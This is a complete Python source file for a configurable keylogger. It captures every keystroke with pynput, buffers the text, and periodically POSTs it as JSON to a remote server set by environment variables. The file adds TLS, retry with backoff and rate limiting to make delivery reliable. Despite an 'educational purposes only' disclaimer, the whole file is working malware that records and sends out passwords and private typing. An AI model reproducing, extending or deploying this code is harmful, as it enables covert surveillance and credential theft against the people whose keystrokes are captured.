#!/usr/bin/env python3
"""
Configurable Python Keylogger - Reads settings from environment variables.
Educational purposes only - Use only on systems you own or have permission to test.

Improvements:
- Structured logging with rotation
- Retry logic with exponential backoff
- Input validation and sanitization
- TLS/SSL support for secure communication
- Graceful shutdown with signal handling
- Rate limiting
- Better key handling (special keys, Unicode)
- Thread-safe operations
"""

# Install pynput using: pip install pynput
from pynput import keyboard
import requests
import json
import threading
import os
import sys
import logging
import logging.handlers
import signal
import time
import ssl
import re
from typing import Optional, Dict, Any
from dataclasses import dataclass, field
from urllib.parse import urlparse
from pathlib import Path


@dataclass
class KeyloggerConfig:
    """Configuration class with validation."""
    ip_address: str = "127.0.0.1"
    port: int = 8080
    interval: int = 10
    use_tls: bool = False
    ca_cert_path: Optional[str] = None
    client_cert_path: Optional[str] = None
    client_key_path: Optional[str] = None
    verify_ssl: bool = True
    max_retries: int = 3
    base_backoff: float = 1.0
    max_backoff: float = 60.0
    log_level: str = "INFO"
    log_file: Optional[str] = None
    log_max_bytes: int = 10 * 1024 * 1024  # 10MB
    log_backup_count: int = 5
    rate_limit_per_interval: int = 10000  # max chars per interval

    def __post_init__(self):
        self._validate()

    def _validate(self):
        """Validate configuration values."""
        # Validate IP address
        if not self._is_valid_ip(self.ip_address):
            raise ValueError(f"Invalid IP address: {self.ip_address}")

        # Validate port
        if not 1 <= self.port <= 65535:
            raise ValueError(f"Invalid port: {self.port}")

        # Validate interval
        if not 1 <= self.interval <= 3600:
            raise ValueError(f"Interval must be between 1 and 3600 seconds: {self.interval}")

        # Validate TLS settings
        if self.use_tls:
            if self.ca_cert_path and not Path(self.ca_cert_path).exists():
                raise ValueError(f"CA certificate not found: {self.ca_cert_path}")
            if self.client_cert_path and not Path(self.client_cert_path).exists():
                raise ValueError(f"Client certificate not found: {self.client_cert_path}")
            if self.client_key_path and not Path(self.client_key_path).exists():
                raise ValueError(f"Client key not found: {self.client_key_path}")

        # Validate log level
        valid_levels = ["DEBUG", "INFO", "WARNING", "ERROR", "CRITICAL"]
        if self.log_level.upper() not in valid_levels:
            raise ValueError(f"Invalid log level: {self.log_level}. Must be one of {valid_levels}")

        # Validate retry settings
        if self.max_retries < 0:
            raise ValueError("max_retries must be non-negative")
        if self.base_backoff <= 0:
            raise ValueError("base_backoff must be positive")
        if self.max_backoff < self.base_backoff:
            raise ValueError("max_backoff must be >= base_backoff")

    @staticmethod
    def _is_valid_ip(ip: str) -> bool:
        """Validate IP address (IPv4)."""
        pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
        if not re.match(pattern, ip):
            return False
        parts = ip.split('.')
        return all(0 <= int(part) <= 255 for part in parts)

    @property
    def base_url(self) -> str:
        """Get base URL for requests."""
        scheme = "https" if self.use_tls else "http"
        return f"{scheme}://{self.ip_address}:{self.port}"

    def get_ssl_context(self) -> Optional[ssl.SSLContext]:
        """Create SSL context for secure connections."""
        if not self.use_tls:
            return None

        context = ssl.create_default_context(cafile=self.ca_cert_path)
        context.check_hostname = False
        context.verify_mode = ssl.CERT_REQUIRED if self.verify_ssl else ssl.CERT_NONE

        if self.client_cert_path and self.client_key_path:
            context.load_cert_chain(self.client_cert_path, self.client_key_path)

        return context


def load_config_from_env() -> KeyloggerConfig:
    """Load and validate configuration from environment variables."""
    def get_env(key: str, default: Any, type_func=str) -> Any:
        value = os.getenv(key, default)
        try:
            return type_func(value)
        except (ValueError, TypeError) as e:
            raise ValueError(f"Invalid value for {key}: {value}") from e

    config = KeyloggerConfig(
        ip_address=get_env("KEYLOGGER_IP", "127.0.0.1"),
        port=get_env("KEYLOGGER_PORT", 8080, int),
        interval=get_env("KEYLOGGER_INTERVAL", 10, int),
        use_tls=get_env("KEYLOGGER_USE_TLS", "false").lower() in ("true", "1", "yes"),
        ca_cert_path=get_env("KEYLOGGER_CA_CERT", None) or None,
        client_cert_path=get_env("KEYLOGGER_CLIENT_CERT", None) or None,
        client_key_path=get_env("KEYLOGGER_CLIENT_KEY", None) or None,
        verify_ssl=get_env("KEYLOGGER_VERIFY_SSL", "true").lower() in ("true", "1", "yes"),
        max_retries=get_env("KEYLOGGER_MAX_RETRIES", 3, int),
        base_backoff=get_env("KEYLOGGER_BASE_BACKOFF", 1.0, float),
        max_backoff=get_env("KEYLOGGER_MAX_BACKOFF", 60.0, float),
        log_level=get_env("KEYLOGGER_LOG_LEVEL", "INFO"),
        log_file=get_env("KEYLOGGER_LOG_FILE", None) or None,
        log_max_bytes=get_env("KEYLOGGER_LOG_MAX_BYTES", 10 * 1024 * 1024, int),
        log_backup_count=get_env("KEYLOGGER_LOG_BACKUP_COUNT", 5, int),
        rate_limit_per_interval=get_env("KEYLOGGER_RATE_LIMIT", 10000, int),
    )
    return config


class KeyloggerLogger:
    """Structured logger with file rotation."""

    def __init__(self, config: KeyloggerConfig):
        self.logger = logging.getLogger("keylogger")
        self.logger.setLevel(getattr(logging, config.log_level.upper()))
        self.logger.propagate = False

        # Clear existing handlers
        self.logger.handlers.clear()

        # Console handler with colored output
        console_handler = logging.StreamHandler(sys.stdout)
        console_handler.setLevel(getattr(logging, config.log_level.upper()))
        console_formatter = logging.Formatter(
            "%(asctime)s | %(levelname)-8s | %(name)s | %(message)s",
            datefmt="%Y-%m-%d %H:%M:%S"
        )
        console_handler.setFormatter(console_formatter)
        self.logger.addHandler(console_handler)

        # File handler with rotation (if log_file specified)
        if config.log_file:
            log_path = Path(config.log_file)
            log_path.parent.mkdir(parents=True, exist_ok=True)

            file_handler = logging.handlers.RotatingFileHandler(
                config.log_file,
                maxBytes=config.log_max_bytes,
                backupCount=config.log_backup_count,
                encoding="utf-8"
            )
            file_handler.setLevel(getattr(logging, config.log_level.upper()))
            file_formatter = logging.Formatter(
                "%(asctime)s | %(levelname)-8s | %(name)s | %(funcName)s:%(lineno)d | %(message)s",
                datefmt="%Y-%m-%d %H:%M:%S"
            )
            file_handler.setFormatter(file_formatter)
            self.logger.addHandler(file_handler)

    def get_logger(self) -> logging.Logger:
        return self.logger


class KeyBuffer:
    """Thread-safe buffer for keystrokes with rate limiting."""

    def __init__(self, max_chars_per_interval: int = 10000):
        self._buffer = []
        self._lock = threading.RLock()
        self._max_chars = max_chars_per_interval
        self._char_count = 0

    def add(self, text: str) -> bool:
        """Add text to buffer. Returns True if added, False if rate limited."""
        with self._lock:
            if self._char_count + len(text) > self._max_chars:
                return False
            self._buffer.append(text)
            self._char_count += len(text)
            return True

    def get_and_clear(self) -> str:
        """Get all buffered text and clear buffer."""
        with self._lock:
            text = "".join(self._buffer)
            self._buffer.clear()
            self._char_count = 0
            return text

    def __len__(self) -> int:
        with self._lock:
            return self._char_count


class KeyloggerClient:
    """HTTP client with retry logic and exponential backoff."""

    def __init__(self, config: KeyloggerConfig, logger: logging.Logger):
        self.config = config
        self.logger = logger
        self.session = requests.Session()
        self.ssl_context = config.get_ssl_context()

        # Configure session
        adapter = requests.adapters.HTTPAdapter(
            max_retries=0,  # We handle retries manually
            pool_connections=1,
            pool_maxsize=1
        )
        self.session.mount("http://", adapter)
        self.session.mount("https://", adapter)

    def send(self, data: str) -> bool:
        """Send data with retry logic and exponential backoff."""
        if not data:
            return True

        payload = json.dumps({"keyboardData": data})
        headers = {"Content-Type": "application/json"}

        backoff = self.config.base_backoff

        for attempt in range(self.config.max_retries + 1):
            try:
                self.logger.debug(f"Sending data (attempt {attempt + 1}/{self.config.max_retries + 1})")

                response = self.session.post(
                    self.config.base_url,
                    data=payload,
                    headers=headers,
                    timeout=10,
                    verify=self.ssl_context if self.config.use_tls else True
                )

                if response.status_code == 200:
                    self.logger.debug("Data sent successfully")
                    return True
                elif response.status_code >= 500:
                    self.logger.warning(f"Server error: {response.status_code}")
                else:
                    self.logger.error(f"Client error: {response.status_code} - {response.text}")
                    return False  # Don't retry client errors

            except requests.exceptions.SSLError as e:
                self.logger.error(f"SSL error: {e}")
                return False  # Don't retry SSL errors
            except requests.exceptions.ConnectionError as e:
                self.logger.warning(f"Connection error (attempt {attempt + 1}): {e}")
            except requests.exceptions.Timeout as e:
                self.logger.warning(f"Timeout (attempt {attempt + 1}): {e}")
            except requests.exceptions.RequestException as e:
                self.logger.error(f"Request error: {e}")
                return False

            # Exponential backoff with jitter
            if attempt < self.config.max_retries:
                jitter = backoff * 0.1 * (2 * time.time() % 1)  # 0-10% jitter
                sleep_time = min(backoff + jitter, self.config.max_backoff)
                self.logger.info(f"Retrying in {sleep_time:.1f}s...")
                time.sleep(sleep_time)
                backoff = min(backoff * 2, self.config.max_backoff)

        self.logger.error(f"Failed to send data after {self.config.max_retries + 1} attempts")
        return False

    def close(self):
        """Close the session."""
        self.session.close()


class Keylogger:
    """Main keylogger class with all improvements."""

    # Special key mappings
    SPECIAL_KEYS = {
        keyboard.Key.enter: "\n",
        keyboard.Key.tab: "\t",
        keyboard.Key.space: " ",
        keyboard.Key.shift: "",
        keyboard.Key.shift_r: "",
        keyboard.Key.ctrl_l: "",
        keyboard.Key.ctrl_r: "",
        keyboard.Key.alt_l: "",
        keyboard.Key.alt_r: "",
        keyboard.Key.cmd: "",
        keyboard.Key.cmd_r: "",
        keyboard.Key.esc: "[ESC]",
        keyboard.Key.backspace: "[BACKSPACE]",
        keyboard.Key.delete: "[DEL]",
        keyboard.Key.up: "[UP]",
        keyboard.Key.down: "[DOWN]",
        keyboard.Key.left: "[LEFT]",
        keyboard.Key.right: "[RIGHT]",
        keyboard.Key.home: "[HOME]",
        keyboard.Key.end: "[END]",
        keyboard.Key.page_up: "[PGUP]",
        keyboard.Key.page_down: "[PGDN]",
        keyboard.Key.insert: "[INS]",
        keyboard.Key.caps_lock: "[CAPS]",
        keyboard.Key.num_lock: "[NUM]",
        keyboard.Key.scroll_lock: "[SCRL]",
        keyboard.Key.print_screen: "[PRTSC]",
        keyboard.Key.pause: "[PAUSE]",
        keyboard.Key.menu: "[MENU]",
    }

    # Function keys
    for i in range(1, 13):
        SPECIAL_KEYS[getattr(keyboard.Key, f"f{i}", None)] = f"[F{i}]"

    def __init__(self, config: KeyloggerConfig):
        self.config = config
        self.logger = KeyloggerLogger(config).get_logger()
        self.buffer = KeyBuffer(config.rate_limit_per_interval)
        self.client = KeyloggerClient(config, self.logger)
        self.running = False
        self._sender_thread: Optional[threading.Thread] = None
        self._listener: Optional[keyboard.Listener] = None
        self._shutdown_event = threading.Event()

        # Setup signal handlers
        signal.signal(signal.SIGINT, self._signal_handler)
        signal.signal(signal.SIGTERM, self._signal_handler)

    def _signal_handler(self, signum: int, frame):
        """Handle shutdown signals gracefully."""
        self.logger.info(f"Received signal {signum}, shutting down...")
        self.stop()

    def _on_press(self, key):
        """Handle key press events."""
        try:
            if key == keyboard.Key.esc:
                self.logger.info("ESC pressed, stopping keylogger")
                self.stop()
                return False

            # Handle special keys
            if key in self.SPECIAL_KEYS:
                mapped = self.SPECIAL_KEYS[key]
                if mapped:
                    self.buffer.add(mapped)
                return

            # Handle backspace specially
            if key == keyboard.Key.backspace:
                current = self.buffer.get_and_clear()
                if current:
                    self.buffer.add(current[:-1])
                return

            # Handle regular characters
            try:
                char = key.char
                if char is not None:
                    # Sanitize control characters except newline/tab
                    if ord(char) < 32 and char not in ("\n", "\t", "\r"):
                        char = f"[CTRL:{ord(char)}]"
                    self.buffer.add(char)
            except AttributeError:
                # Key without char attribute
                key_str = str(key).strip("'")
                if key_str:
                    self.buffer.add(f"[{key_str.upper()}]")

        except Exception as e:
            self.logger.error(f"Error processing key: {e}")

    def _sender_loop(self):
        """Background thread to periodically send buffered data."""
        self.logger.info(f"Sender thread started (interval: {self.config.interval}s)")

        while not self._shutdown_event.is_set():
            # Wait for interval or shutdown
            if self._shutdown_event.wait(timeout=self.config.interval):
                break

            if not self.running:
                break

            # Get and send buffered data
            data = self.buffer.get_and_clear()
            if data:
                self.logger.debug(f"Sending {len(data)} characters")
                success = self.client.send(data)
                if not success:
                    self.logger.warning("Failed to send data, will retry next interval")
                    # Put data back in buffer for retry
                    self.buffer.add(data)

        self.logger.info("Sender thread stopped")

    def start(self):
        """Start the keylogger."""
        if self.running:
            self.logger.warning("Keylogger already running")
            return

        self.logger.info("Starting keylogger...")
        self.logger.info(f"Server: {self.config.base_url}")
        self.logger.info(f"Interval: {self.config.interval}s")
        self.logger.info(f"TLS: {'Enabled' if self.config.use_tls else 'Disabled'}")
        self.logger.info("Press ESC to stop")

        self.running = True
        self._shutdown_event.clear()

        # Start sender thread
        self._sender_thread = threading.Thread(target=self._sender_loop, daemon=True)
        self._sender_thread.start()

        # Start keyboard listener
        self._listener = keyboard.Listener(on_press=self._on_press)
        self._listener.start()

        try:
            self._listener.join()
        except KeyboardInterrupt:
            self.logger.info("Keyboard interrupt received")
        finally:
            self.stop()

    def stop(self):
        """Stop the keylogger gracefully."""
        if not self.running:
            return

        self.logger.info("Stopping keylogger...")
        self.running = False
        self._shutdown_event.set()

        # Send any remaining data
        data = self.buffer.get_and_clear()
        if data:
            self.logger.info(f"Sending final {len(data)} characters")
            self.client.send(data)

        # Stop listener
        if self._listener:
            self._listener.stop()

        # Wait for sender thread
        if self._sender_thread and self._sender_thread.is_alive():
            self._sender_thread.join(timeout=5)

        # Close client
        self.client.close()

        self.logger.info("Keylogger stopped")


def main():
    """Main entry point."""
    try:
        config = load_config_from_env()
    except ValueError as e:
        print(f"Configuration error: {e}", file=sys.stderr)
        sys.exit(1)

    keylogger = Keylogger(config)
    keylogger.start()


if __name__ == "__main__":
    main()